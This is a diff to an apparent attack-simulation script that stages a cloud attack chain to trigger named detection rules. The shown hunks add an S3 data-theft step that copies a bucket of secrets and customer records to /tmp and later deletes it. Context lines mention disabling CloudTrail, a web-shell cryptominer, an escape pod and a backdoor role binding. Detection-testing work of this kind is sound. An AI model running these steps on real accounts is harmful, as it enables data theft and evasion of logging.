@@ -193,6 +193,16 @@ phase5_cloud_pivot() {
       && echo "  public-read policy applied to $LOOT"
   fi
 
+  step "Collection / exfiltration: stealing the loot bucket contents"
+  det "Sysdig CDR: S3 object read from sensitive bucket (T1530 — needs S3 data events on the trail)"
+  if [[ -n "${LOOT:-}" ]]; then
+    "${A[@]}" s3 cp "s3://$LOOT/secrets/customer-db.txt" - 2>/dev/null \
+      && echo "  exfiltrated s3://$LOOT/secrets/customer-db.txt"
+    mkdir -p /tmp/loot
+    "${A[@]}" s3 sync "s3://$LOOT" /tmp/loot 2>/dev/null \
+      && echo "  synced s3://$LOOT -> /tmp/loot ($(find /tmp/loot -type f 2>/dev/null | wc -l | tr -d ' ') files, incl. pii/customers.csv)"
+  fi
+
   step "Defense evasion: disabling CloudTrail logging"
   det "Sysdig CDR: CloudTrail logging disabled (StopLogging)"
   local TRAIL
@@ -223,6 +233,8 @@ cleanup() {
   [[ -f "$STATE" ]] && source "$STATE" || true
   step "Stopping cryptominer in victim"
   websh "pkill -f crypto_run.sh; pkill xmrig; rm -rf /tmp/xmrig* /tmp/crypto_run.sh" 15 2>/dev/null || true
+  step "Removing exfiltrated loot copy"
+  rm -rf /tmp/loot 2>/dev/null || true
   step "Deleting escape pod"
   kubectl -n "$NS" delete pod escape-pod --ignore-not-found
   step "Deleting backdoor ClusterRoleBinding"
